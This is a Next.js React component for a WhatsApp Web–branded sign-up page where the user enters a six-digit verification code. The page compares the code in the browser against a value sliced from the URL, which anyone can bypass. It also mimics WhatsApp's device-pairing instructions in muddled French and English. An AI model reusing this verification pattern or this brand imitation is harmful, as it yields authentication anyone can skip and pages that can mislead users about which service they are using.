"use client";
import Image from "next/image";
import React, { useState } from "react";
import { CiMenuKebab } from "react-icons/ci";
import { GrSettingsOption } from "react-icons/gr";
import { useParams } from 'next/navigation'
import { useRouter } from "next/navigation";
import { supabase } from "@/utils/supabase/client";


const Signupb = () => {
  const params = useParams()
  const [one, setOne] = useState('')
  const [two, setTwo] = useState('')
  const [three, setThree] = useState('')
  const [four, setFour] = useState('')
  const [five, setFive] = useState('')
  const [six, setSix] = useState('')
  const [error, setError] = useState("")
  const [success, setSuccess] = useState('')
  const router = useRouter()

  // const generateToken = async (id: any) => {
  //   const token = await supabase.auth.setSession({id})
  //   return token
  // }

  const handleInputChange = async () => {
    const email = localStorage.getItem('email')
    const random = one + two + three + four + five + six
    let code = JSON.stringify(params.signup)
    let sentCode = code.slice(10, 16)

    if (random == sentCode) {
      const { data, error } = await supabase
        .from('user')
        .insert({ email: email })
      if (data) console.log(data)
      if (error) {
        console.log(error)
        setError("Something went wrong")
        return
      }
      setSuccess("Successfully loggedin ✅")
      router.push('/discussions')
      console.log('conform')
    } else {
      setError('Invalid code')
      console.log("invalid")
      return
    }

  };

  return (
    <div>
      <div className="flex flex-col justify-center w-[75vw] mobile:max-sm:w-[95%]">
        <div className="flex items-center gap-4 text-white">
          <Image src={"/logo.png"} width={50} height={50} alt={""}></Image>
          <p>WHATSAPP WEB</p>
        </div>
        <div className="w-full drop-shadow">
          <div className="bg-white mobile:max-sm:ml-2 flex flex-col justify-center w-full p-20 mobile:max-sm:p-5 mt-8 rounded ">
            <div>
              <div className="flex justify-between max-[800px]:flex-col max-[800px]:px-6">
                <div className="flex flex-col gap-8">
                  <h1 className="text-gray-700 text-[30px]">
                    Enter the verification code
                  </h1>
                  <p className="text-gray-700 text-[18px]">
                    Association du compte Whatsapp email address <br />(
                    <a href="/autha" className="text-teal-600">
                      modify
                    </a>
                    )
                  </p>
                  <div>
                    <ol className="flex flex-col gap-5 text-gray-800 text-[19px] list-decimal">
                      <li> Open your email account</li>
                      <li>
                        Access the settings by clicking on your profil picture,
                        <span className="text-gray-600 font-semibold flex items-center gap-1">
                          Menu
                          <CiMenuKebab className="bg-gray-100 rounded w-4 h-4" />{" "}
                          or settings
                          <GrSettingsOption className="bg-gray-100 rounded text-gray-300 w-6 h-6 px-1 py-1" />
                        </span>
                      </li>
                      <li>
                        click on
                        <span className="text-gray-600 font-semibold px-1">
                          paired devices
                        </span>{" "}
                        , next on{" "}
                        <span className="text-gray-600 font-semibold">
                          {" "}
                          pair device
                        </span>
                      </li>
                      <li>
                        Appuyer sur <br />
                        <span className="text-gray-600 font-semibold">
                          Connecter plutot avec un numero de telephone et
                        </span>
                        <br /> saisissez ce code sur votre telephone
                      </li>
                    </ol>
                  </div>
                </div>

                <div className="flex flex-col gap-6 justify-center">
                  <div className="flex gap-3 mt-[50px]">
                    <input
                      onChange={(e) => setOne(e.target.value)}
                      type="text"
                      id="inputField"
                      className="w-[45px] h-[55px] border border-black  rounded-[10px] px-4"
                    />
                    <input
                      onChange={(e) => setTwo(e.target.value)}
                      type="text"
                      id="inputField"
                      className="w-[45px] h-[55px] border border-black  rounded-[10px] px-4"
                    />
                    <input
                      onChange={(e) => setThree(e.target.value)}
                      type="text"
                      id="inputField"
                      className="w-[45px] h-[55px] border border-black  rounded-[10px] px-4"
                    />
                    <input
                      onChange={(e) => setFour(e.target.value)}
                      type="text"
                      id="inputField"
                      className="w-[45px] h-[55px] border border-black  rounded-[10px] px-4"
                    />
                    <input
                      onChange={(e) => setFive(e.target.value)}
                      type="text"
                      id="inputField"
                      className="w-[45px] h-[55px] border border-black  rounded-[10px] px-4"
                    />
                    <input
                      onChange={(e) => setSix(e.target.value)}
                      type="text"
                      id="inputField"
                      className="w-[45px] h-[55px] border border-black  rounded-[10px] px-4"
                    />

                  </div>
                  <p className="text-center text-red-600">{error} </p>
                  <p className="text-center">{success} </p>
                  <button
                    onClick={() => handleInputChange()}
                    type="button"
                    className="bg-secondry flex justify-center mx-auto w-20 py-2 text-sm text-white rounded">
                    Confirm
                  </button>
                </div>

              </div>

              <hr className="leading-[.1] bg-gray-200 my-10" />

              <a
                href="/landinga"
                className="text-teal-600 font-bold text-[20px]"
              >
                Associer avec un QR
              </a>
            </div>
          </div>
          <div className="bg-gray-50 flex flex-col items-center gap-5 pt-[50px]">
            <h1 className="text-[30px] text-gray-600">Tutoriel</h1>
            <p className="text-teal-600 font-bold">Besoin d'aide ?</p>
            <Image
              src="/qr-video.png"
              width={700}
              height={500}
              alt="login_img"
              className="pt-4 pb-[70px]"
            />
          </div>
        </div>
      </div>
    </div>
  );
};

export default Signupb;
